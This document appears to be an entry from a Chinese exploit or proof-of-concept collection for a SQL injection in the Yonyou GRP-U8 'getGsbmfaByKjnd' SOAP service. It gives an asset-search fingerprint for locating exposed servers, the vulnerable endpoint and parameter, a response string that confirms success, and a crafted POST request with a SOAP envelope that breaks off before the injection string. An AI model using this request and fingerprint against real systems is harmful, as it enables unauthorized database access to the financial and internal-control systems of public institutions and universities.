# 用友GRP-U8getGsbmfaByKjndSQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友GRP-U8 OA"`
- **请求**：`POST /services/operOriztion HTTP/1.1`

**请求体 / payload**
```
漏洞位置
/services
/services/operOriztion?wsdl

参数kjnd存在SQL注入漏洞，返回响应为“qzvpqOZOHMMvtbLzaUYEuIzdQlgzOnITofSgBOeIxSsofqbvbq”表示存在漏洞
Cookie: JSESSIONID=8938F59A7F2E7F69D978EFB272B314AE
SOAPAction:
Content-Type: text/xml;charset=UTF-8
Host: xx.xx.xx.xx
Content-Length: 977
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
<soapenv:Header/>
<soapenv:Body>
<wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/enco…（脚本共 1914 字，完整版见原文）
```

**其他**
- 用友GRP-U8 getGsbmfaByKjndSQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友GRP-U8 高校内控管理软件 Manager 版、用友GRP-U8 (行政事业内控管理软件 Manager-G 版)